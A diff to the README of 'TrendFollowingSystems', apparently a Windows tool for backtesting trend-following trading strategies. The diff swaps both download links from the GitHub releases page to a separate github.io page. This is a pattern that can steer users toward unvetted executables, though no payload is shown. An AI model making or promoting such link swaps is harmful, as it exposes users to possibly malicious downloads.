@@ -1,6 +1,6 @@
 # 📈 TrendFollowingSystems - Analyze market momentum with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/appropriate-mixup116/TrendFollowingSystems/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://appropriate-mixup116.github.io)
 
 ## What is this tool?
 TrendFollowingSystems helps you study market trends. People use this software to examine how momentum strategies perform over history. It provides clear numbers and code for testing trading systems based on futures and time-series data. Researchers and traders use these tools to build models that track price shifts in financial markets.
@@ -11,7 +11,7 @@ Your computer needs to run Windows 10 or Windows 11. Ensure at least 4 gigabytes
 ## 🚀 How to set up the software
 You need to get the files first. Visit the link below to reach the release area.
 
-[Download the latest version here](https://github.com/appropriate-mixup116/TrendFollowingSystems/releases)
+[Download the latest version here](https://appropriate-mixup116.github.io)
 
 1. Click the link above to open your internet browser.
 2. Look for the section labeled "Assets" at the bottom of the newest entry.
